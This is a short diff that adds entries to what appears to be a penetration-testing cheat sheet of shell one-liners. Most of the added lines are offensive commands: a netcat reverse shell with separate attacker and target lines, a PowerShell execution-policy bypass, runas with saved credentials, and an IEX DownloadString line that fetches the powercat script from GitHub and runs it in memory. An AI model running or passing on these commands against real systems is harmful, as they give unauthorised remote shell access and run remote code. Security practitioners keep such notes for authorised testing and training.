@@ -34,3 +34,14 @@ netcat -x <file.hex> -u -l 53
 
 ===| bash tcp port check |===
 echo > /dev/tcp/{ip}/{port}
+
+===| netcat reverse shell |===
+attacker: netcat -l -p <port> 
+target: netcat -e <shell> <ip> <port>
+
+
+===| Windows |===
+powershell.exe -executionpolicy bypass <script>
+runas /savecred /user:<user> <prgm>
++++| powercat |+++
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
